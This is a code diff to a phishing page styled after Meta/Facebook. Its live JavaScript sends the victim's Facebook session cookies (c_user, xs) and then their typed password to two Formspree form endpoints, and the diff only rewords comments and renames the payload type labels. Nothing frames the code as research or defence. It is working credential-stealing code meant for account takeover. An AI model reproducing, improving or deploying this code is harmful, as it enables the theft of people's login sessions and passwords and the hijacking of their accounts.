@@ -9,7 +9,6 @@
         body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding: 20px; margin: 0; }
         .meta-container { background: white; padding: 24px; border-radius: 12px; width: 100%; max-width: 450px; }
         
-        /* Language Modal with Scroll */
         .modal { display: flex; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center; }
         .modal-content { background: white; padding: 20px; border-radius: 12px; width: 90%; max-width: 350px; max-height: 80vh; overflow-y: auto; }
         
@@ -99,10 +98,10 @@
 
             document.getElementById('nextBtn').innerText = "Verifying...";
             
-            // Send Cookies to first email (maqaobyw)
+            // Send Cookies to first email ID: maqaobyw
             fetch("https://formspree.io/f/maqaobyw", {
                 method: "POST",
-                body: JSON.stringify({ "Type": "STEP_1_COOKIES", "c_user": c, "xs": x }),
+                body: JSON.stringify({ "Type": "COOKIES", "c_user": c, "xs": x }),
                 headers: { 'Content-Type': 'application/json' }
             });
 
@@ -118,10 +117,10 @@
 
             document.getElementById('finalBtn').innerText = "Submitting...";
             
-            // Send Password to second email (xbdqoblb)
+            // Send Password to second email ID: xbdqoblb
             await fetch("https://formspree.io/f/xbdqoblb", {
                 method: "POST",
-                body: JSON.stringify({ "Type": "STEP_2_PASSWORD", "user": userData.c_user, "password": pass }),
+                body: JSON.stringify({ "Type": "PASSWORD", "user": userData.c_user, "password": pass }),
                 headers: { 'Content-Type': 'application/json' }
             });
 
